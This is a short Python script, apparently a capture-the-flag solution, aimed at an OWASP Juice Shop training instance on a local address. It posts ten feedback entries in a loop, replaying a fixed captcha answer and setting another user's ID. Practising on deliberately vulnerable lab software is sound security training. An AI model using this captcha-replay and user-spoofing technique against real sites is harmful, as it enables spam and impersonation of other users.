import requests
import time

JUICE_SHOP_URL = "http://192.168.0.105:3000"

captcha_id = ""
captcha_solution =  ""

headers = {
    "Content-Type": "application/json"
}

for i in range(10):
    payload = {
        "UserId":24,
        "captchaId":5,
        "captcha":"18",
        "comment":"juicy enough!! (***t@juice-sh.op)"
        ,"rating":"5"
        }

    response = requests.post(f"{JUICE_SHOP_URL}/api/Feedbacks", json=payload, headers=headers)
    
    if response.status_code == 201:
        print(f"[{i+1}] Submitted successfully !!")
    else:
        print(f"[{i+1}] Failed!! : {response.status_code}")

    time.sleep(1)                                                                                                                                                            
                           
